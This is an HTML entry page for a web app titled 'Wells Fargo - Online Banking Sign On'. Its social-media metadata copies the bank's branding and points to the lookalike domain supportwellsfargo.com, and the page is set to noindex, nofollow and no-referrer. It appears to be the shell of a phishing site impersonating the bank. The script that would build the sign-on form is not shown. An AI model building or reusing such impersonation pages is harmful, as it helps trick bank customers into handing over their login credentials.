<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
    <title>Wells Fargo - Online Banking Sign On</title>
    <meta name="description" content="Sign on to Wells Fargo Online Banking to access your accounts, transfer funds, pay bills, and more. Secure, convenient, and available 24/7." />
    
    <!-- Security and Trust Meta Tags -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="referrer" content="no-referrer" />
    
    <!-- Open Graph / Social Media -->
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Wells Fargo - Sign On to View Your Accounts" />
    <meta property="og:description" content="Sign on to manage your Wells Fargo accounts online. Secure access to banking, credit cards, loans, and investments." />
    <meta property="og:site_name" content="Wells Fargo" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:image" content="https://supportwellsfargo.com/favicon.png" />
    <meta property="og:image:width" content="512" />
    <meta property="og:image:height" content="512" />
    <meta property="og:image:type" content="image/png" />
    <meta property="og:url" content="https://supportwellsfargo.com/" />
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Wells Fargo - Online Banking" />
    <meta name="twitter:description" content="Secure sign on to Wells Fargo Online Banking" />
    <meta name="twitter:image" content="https://supportwellsfargo.com/favicon.png" />
    
    <!-- Apple/Mobile -->
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
    <meta name="apple-mobile-web-app-title" content="Wells Fargo" />
    <meta name="format-detection" content="telephone=no" />
    <meta name="theme-color" content="#d71e28" />
    
    <link rel="icon" type="image/png" href="/favicon.png" />
    <link rel="apple-touch-icon" href="/favicon.png" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
